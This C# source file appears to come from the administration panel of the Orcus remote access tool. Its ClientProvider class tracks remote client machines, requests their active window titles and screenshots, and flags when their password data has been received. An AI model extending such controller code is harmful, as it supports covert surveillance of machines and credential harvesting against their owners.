using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Linq;
using System.Windows;
using Orcus.Shared.Connection;
using Orcus.Shared.DataTransferProtocol;

namespace Orcus.Administration.Core.ClientManagement
{
    public class ClientProvider
    {
        private readonly Dictionary<ClientViewModel, BaseClientInformation> _clientData;
        private readonly List<int> _clientsUpdating;
        private readonly object _clientUpdateLock = new object();
        private readonly DtpFactory _dtpFactory;

        public ClientProvider(LightInformation clientInfo, DtpFactory dtpFactory)
        {
            _clientData = clientInfo.Clients.Select(x =>
            {
                x.Group = clientInfo.Groups[x.GroupId];
                x.OsName = clientInfo.OperatingSystems[x.OsNameId];
                return x;
            }).ToDictionary(x => new ClientViewModel(x), y => (BaseClientInformation) y);

            Clients = new ObservableCollection<ClientViewModel>(_clientData.Select(x => x.Key));

            _clientsUpdating = new List<int>();
            _dtpFactory = dtpFactory;
            Groups = new ObservableCollection<string>(Clients.GroupBy(x => x.Group).Select(x => x.Key));
        }

        public ObservableCollection<ClientViewModel> Clients { get; }
        public ObservableCollection<string> Groups { get; }

        public BaseClientInformation GetClientInformation(ClientViewModel clientViewModel)
        {
            return _clientData[clientViewModel];
        }

        public void GetActiveWindows(List<int> clients)
        {
            _dtpFactory.ExecuteProcedure("GetClientActiveWindowTitle", clients);
        }

        public void GetClientScreens(List<int> clients)
        {
            _dtpFactory.ExecuteProcedure("GetClientScreen", clients);
        }

        public List<BaseClientInformation> GetAllClients()
        {
            return _clientData.Values.ToList();
        }

        public void RequestClientInformation(List<ClientViewModel> clients)
        {
            lock (_clientUpdateLock)
            {
                foreach (var client in clients)
                {
                    if (_clientsUpdating.Contains(client.Id))
                        clients.Remove(client);
                    else
                        _clientsUpdating.Add(client.Id);
                }
            }

            if (clients.Count == 0)
                return;

            Debug.Print("Request: " + clients.Count);
            var result = _dtpFactory.ExecuteFunction<List<ClientInformation>>("GetClientDetails", null,
                new List<Type>
                {
                    typeof (List<ClientInformation>),
                    typeof (OnlineClientInformation),
                    typeof (OfflineClientInformation)
                }, clients.Select(x => x.Id).ToList());

            lock (_clientUpdateLock)
            {
                foreach (var clientViewModel in clients)
                {
                    _clientsUpdating.Remove(clientViewModel.Id);
                    var updatedEntry = result.FirstOrDefault(x => x.Id == clientViewModel.Id);
                    if (updatedEntry == null)
#if DEBUG
                        throw new Exception("Something went wrong");
#else
                        continue;
#endif
                    var offlineClient = updatedEntry as OfflineClientInformation;
                    if (offlineClient != null)
                        offlineClient.LastSeen = offlineClient.LastSeen.ToLocalTime();
                    else
                    {
                        var onlineClient = (OnlineClientInformation) updatedEntry;
                        onlineClient.OnlineSince = onlineClient.OnlineSince.ToLocalTime();
                    }
                    clientViewModel.Update(updatedEntry);
                    _clientData[clientViewModel] = updatedEntry;
                }
            }
        }

        public void NewClientConnected(OnlineClientInformation onlineClientInformation)
        {
            onlineClientInformation.OnlineSince = onlineClientInformation.OnlineSince.ToLocalTime();

            var viewModel = new ClientViewModel(onlineClientInformation);
            viewModel.Update(onlineClientInformation);
            _clientData.Add(viewModel, onlineClientInformation);
            Clients.Add(viewModel);

            if (!Groups.Contains(onlineClientInformation.Group))
                Groups.Add(onlineClientInformation.Group);
        }

        public void ClientConnected(OnlineClientInformation onlineClientInformation)
        {
            onlineClientInformation.OnlineSince = onlineClientInformation.OnlineSince.ToLocalTime();

            var client = Clients.FirstOrDefault(x => x.Id == onlineClientInformation.Id);
            if (client == null)
#if DEBUG
                throw new Exception("Unknown client connected");
#else
            {
                NewClientConnected(onlineClientInformation);
                return;
            }
#endif

            client.Update(onlineClientInformation);
            _clientData[client] = onlineClientInformation;
        }

        public void ClientDisconnected(int clientId)
        {
            var client = Clients.FirstOrDefault(x => x.Id == clientId);
            if (client == null)
#if DEBUG
                throw new Exception("Unknown client disconnected");
#else
                return;
#endif

            client.Disconnected();
            var clientInfo = _clientData[client];
            if (clientInfo != null)
            {
                var onlineInfo = clientInfo as OnlineClientInformation;
                if (onlineInfo == null)
                    return;

                _clientData[client] = new OfflineClientInformation
                {
                    Group = onlineInfo.Group,
                    Id = onlineInfo.Id,
                    Language = onlineInfo.Language,
                    LastSeen = DateTime.Now,
                    OsType = onlineInfo.OsType,
                    UserName = onlineInfo.UserName,
                    OsName = onlineInfo.OsName
                };
            }
        }

        public void ComputerInformationAvailable(int clientId)
        {
            var client = Clients.FirstOrDefault(x => x.Id == clientId);
            if (client == null)
#if DEBUG
                throw new Exception("Unknown client computer information received");
#else
                return;
#endif

            client.IsComputerInformationAvailable = true;
            var clientInfo = _clientData[client];
            var info = clientInfo as ClientInformation;
            if (info != null)
                info.IsPasswordDataAvailable = true;
        }

        public void PasswordsAvailable(int clientId)
        {
            var client = Clients.FirstOrDefault(x => x.Id == clientId);
            if (client == null)
#if DEBUG
                throw new Exception("Unknown client passwords received");
#else
                return;
#endif

            client.IsPasswordDataAvailable = true;
            var clientInfo = _clientData[client];
            var info = clientInfo as ClientInformation;
            if (info != null)
                info.IsPasswordDataAvailable = true;
        }

        public void PasswordsRemoved(int clientId)
        {
            var client = Clients.FirstOrDefault(x => x.Id == clientId);
            if (client == null)
#if DEBUG
                throw new Exception("Unknown client passwords received");
#else
                return;
#endif

            client.IsPasswordDataAvailable = false;
            var clientInfo = _clientData[client];
            var info = clientInfo as ClientInformation;
            if (info != null)
                info.IsPasswordDataAvailable = false;
        }

        public async void ClientGroupChanged(List<int> clients, string name)
        {
            foreach (var clientId in clients)
            {
                var client = Clients.FirstOrDefault(x => x.Id == clientId);
                if (client == null)
#if DEBUG
                    throw new Exception("Unknown client passwords received");
#else
                return;
#endif

                var oldGroup = client.Group;
                client.Group = name;

                var clientInfo = _clientData[client];
                if (clientInfo != null)
                    clientInfo.Group = name;

                if (!Groups.Contains(name))
                    await Application.Current.Dispatcher.BeginInvoke(new Action(() => Groups.Add(name)));

                if (Clients.All(x => x.Group != oldGroup))
                    await Application.Current.Dispatcher.BeginInvoke(new Action(() => Groups.Remove(oldGroup)));
            }
        }

        public async void ClientRemoved(List<int> clients)
        {
            foreach (var clientId in clients)
            {
                var client = Clients.FirstOrDefault(x => x.Id == clientId);
                if (client == null)
#if DEBUG
                    throw new Exception("Unknown client passwords received");
#else
                return;
#endif

                Clients.Remove(client);
                _clientData.Remove(client);

                if (Clients.All(x => x.Group != client.Group))
                    await Application.Current.Dispatcher.BeginInvoke(new Action(() => Groups.Remove(client.Group)));
            }
        }

        public void ClientPluginAvailable(int clientId, PluginInfo pluginInfo)
        {
            var client = Clients.FirstOrDefault(x => x.Id == clientId);
            if (client == null)
#if DEBUG
                throw new Exception("Unknown client passwords received");
#else
                return;
#endif

            var clientInfo = _clientData[client];
            if (clientInfo != null)
            {
                var info = clientInfo as OnlineClientInformation;
                info?.Plugins.Add(pluginInfo);
            }
        }
    }
}